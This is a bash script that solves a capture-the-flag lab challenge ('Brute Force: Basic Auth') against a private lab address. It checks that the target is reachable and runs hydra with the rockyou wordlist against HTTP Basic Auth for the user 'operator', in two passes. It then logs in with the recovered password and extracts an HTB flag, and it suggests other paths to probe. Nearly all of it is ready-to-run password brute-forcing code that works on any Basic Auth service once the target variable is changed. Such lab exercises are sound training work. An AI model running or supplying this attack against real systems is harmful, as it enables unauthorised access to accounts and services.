#!/usr/bin/env bash
# getflag_basic.sh - brute force HTTP Basic Auth and print the flag.
#
# Challenge "05 - Brute Force: Basic Auth":
#   Target: http://10.15.1.54:9005/   user: operator   (password in rockyou)
#   Attack port 9005 only.  Flag: HTB{...}
#
# Run on a machine that can reach the lab (your WiFi box):
#     chmod +x getflag_basic.sh
#     ./getflag_basic.sh
#
# Override inline:
#     TARGET=10.15.1.54 PORT=9005 USER_NAME=operator TOP=5000 ./getflag_basic.sh
set -u

TARGET="${TARGET:-10.15.1.54}"
PORT="${PORT:-9005}"
USER_NAME="${USER_NAME:-operator}"
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
TOP="${TOP:-5000}"          # try the N most common first (rockyou is popularity-ordered)
BASE="http://${TARGET}:${PORT}"

echo "[*] target = ${BASE}   user = ${USER_NAME}"

# ---- 0) connectivity ------------------------------------------------------
CODE="$(curl -s -m 8 -o /dev/null -w '%{http_code}' "${BASE}/")"
if [ "$CODE" = "000" ]; then
  echo "[!] cannot reach ${BASE}/ - wrong network/IP? try TARGET=10.15.0.238"
  exit 2
fi
echo "[+] reachable (HTTP ${CODE} - 401 is expected for Basic Auth)"

if [ ! -f "$WORDLIST" ]; then
  echo "[!] wordlist not found: $WORDLIST"
  echo "    sudo apt-get install -y wordlists   (or set WORDLIST=/path)"
  exit 2
fi

# ---- 1) small list first (fast) ------------------------------------------
head -"$TOP" "$WORDLIST" > /tmp/ba_top.txt 2>/dev/null || cp "$WORDLIST" /tmp/ba_top.txt
echo "[*] pass 1: top ${TOP} passwords (hydra http-get)..."
hydra -I -l "$USER_NAME" -P /tmp/ba_top.txt -s "$PORT" -t 16 -f \
      "$TARGET" http-get / 2>&1 | tee /tmp/ba_hydra.txt

PW="$(grep -oiE 'password: .*' /tmp/ba_hydra.txt | head -1 | sed -E 's/password: //I' | tr -d '\r')"

# ---- 2) full list if not found -------------------------------------------
if [ -z "$PW" ]; then
  echo "[*] pass 2: full wordlist (this can take longer)..."
  hydra -I -l "$USER_NAME" -P "$WORDLIST" -s "$PORT" -t 16 -f \
        "$TARGET" http-get / 2>&1 | tee /tmp/ba_hydra.txt
  PW="$(grep -oiE 'password: .*' /tmp/ba_hydra.txt | head -1 | sed -E 's/password: //I' | tr -d '\r')"
fi

if [ -z "$PW" ]; then
  echo "[!] no credentials found."
  echo "    fallback (handles Basic Auth directly):"
  echo "    python3 brute.py --url ${BASE}/ --username ${USER_NAME} --basic-auth \\"
  echo "                     --wordlist ${WORDLIST} --threads 32"
  exit 1
fi
echo "[+] CREDENTIALS = ${USER_NAME} : ${PW}"

# ---- 3) fetch the flag ----------------------------------------------------
echo "[*] fetching flag with the found credentials..."
BODY="$(curl -s -u "${USER_NAME}:${PW}" "${BASE}/")"
FLAG="$(printf '%s' "$BODY" | grep -oE 'HTB\{[^}]*\}' | head -1)"

if [ -n "$FLAG" ]; then
  echo
  echo "========================================"
  echo "  FLAG: ${FLAG}"
  echo "========================================"
else
  echo "[!] logged in but no HTB{...} found on /. Response (first 500 chars):"
  printf '%s\n' "$BODY" | head -c 500; echo
  echo "    try other paths: for p in / /console /monitor /dashboard; do curl -s -u ${USER_NAME}:${PW} ${BASE}\$p | grep -o 'HTB{[^}]*}'; done"
fi
